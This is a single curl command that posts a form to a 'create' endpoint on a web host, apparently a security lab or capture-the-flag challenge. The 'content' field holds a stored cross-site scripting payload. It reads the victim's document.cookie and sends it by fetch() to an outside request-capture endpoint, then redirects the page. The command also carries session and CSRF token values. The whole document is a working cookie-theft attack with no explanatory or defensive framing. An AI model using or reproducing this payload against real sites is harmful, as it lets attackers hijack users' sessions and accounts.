curl 'https://web.kazet.cc:42448/create' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://web.kazet.cc:42448/create' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://web.kazet.cc:42448' -H 'Connection: keep-alive' -H 'Cookie: csrftoken=NfD23s8bMxGvyS5tEhqaCQ0QpcamqlvB; sessionid=3rni9swt73ryv5aezokfvzcnz9pmk01l' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'csrfmiddlewaretoken=VKOYce4aclvFzVQpeFm9PvVPhysB1pMZyPhQ5w2bOI10XDLIIMC9hbLvwAsNhA7q&recipient=T&content=<script>window.location.href = "http://www.w3schools.com";
var formdata = new FormData();
formdata.append("x", document.cookie);

var requestOptions = {
  method: "POST",
  body: formdata,
  redirect: "follow"
};

fetch("https://eo3trpty9aqag48.m.pipedream.net", requestOptions)
  .then(response => response.text())
  .then(result => console.log(result))
  .catch(error => console.log('error', error));</script>&template=normal'